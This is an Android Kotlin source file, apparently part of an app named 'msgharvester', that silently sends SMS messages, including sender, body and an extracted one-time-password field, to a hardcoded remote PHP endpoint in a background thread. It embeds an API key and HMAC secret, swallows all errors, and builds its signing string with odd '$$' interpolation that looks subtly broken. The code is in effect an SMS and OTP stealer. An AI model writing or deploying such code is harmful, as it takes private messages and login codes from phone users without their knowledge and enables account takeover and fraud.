package com.msgharvester.app

import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.security.SecureRandom
import java.util.concurrent.Executors
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

object NetworkClient {
    private val client = OkHttpClient()
    private val executor = Executors.newSingleThreadExecutor()

    private const val SERVER_URL = "https://dikshtech.com/readsmsapp/readdata.php"
    private const val API_KEY = "a3f7c91e4b20489fb6d12ea7c8f0e1b74e9d3a2c56b147d8f03bc9e5a7d1c42f"
    private const val SHARED_SECRET = "VRnFUvylCNdgA1v1yQ5mso0oAuDVQgL2LmUPD4zDmDipwypoyH"

    private val secureRandom = SecureRandom()

    fun postSmsToServer(id: String, from: String, body: String, date: Long, otp: String? = null) {
        executor.submit {
            try {
                val payload = "{\"id\":\"${escapeJson(id)}\",\"from\":\"${escapeJson(from)}\",\"body\":\"${escapeJson(body)}\",\"date\":$date,\"otp\":\"${escapeJson(otp ?: "")}\"}"

                val timestamp = (System.currentTimeMillis() / 1000L).toString()
                val nonce = generateNonce(24)
                val canonical = "$$payload.$$timestamp.$$nonce"
                val signature = hmacSha256Hex(SHARED_SECRET, canonical)

                val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
                val requestBody = payload.toRequestBody(mediaType)

                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(requestBody)
                    .header("X-API-KEY", API_KEY)
                    .header("X-TIMESTAMP", timestamp)
                    .header("X-NONCE", nonce)
                    .header("X-SIGNATURE", signature)
                    .header("Accept", "application/json")
                    .build()

                client.newCall(request).execute().use { resp ->
                    // Optional: read resp.code or resp.body?.string()
                }
            } catch (e: IOException) {
                // network failure
            } catch (e: Exception) {
                // hmac errors
            }
        }
    }

    private fun generateNonce(sizeBytes: Int): String {
        val bytes = ByteArray(sizeBytes)
        secureRandom.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02x", it) }
    }

    private fun hmacSha256Hex(secret: String, data: String): String {
        val hmacKey = SecretKeySpec(secret.toByteArray(Charsets.UTF_8), "HmacSHA256")
        val mac = Mac.getInstance("HmacSHA256")
        mac.init(hmacKey)
        val raw = mac.doFinal(data.toByteArray(Charsets.UTF_8))
        return raw.joinToString("") { String.format("%02x", it) }
    }

    private fun escapeJson(s: String): String {
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "")
    }
}
